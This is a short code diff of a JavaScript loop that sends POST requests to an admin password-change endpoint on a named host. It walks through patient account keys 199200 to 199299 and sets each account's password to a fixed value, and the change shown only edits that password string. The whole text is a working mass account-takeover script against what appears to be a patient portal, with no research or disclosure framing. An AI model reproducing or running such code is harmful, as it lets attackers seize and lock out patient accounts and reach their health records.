@@ -9,7 +9,7 @@ for (let i = 199200; i <= 199299; i++) {
       return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
+        body: `aPatientKey=${i}&NewPassword=Test%40123%40123`
       });
     });
 }
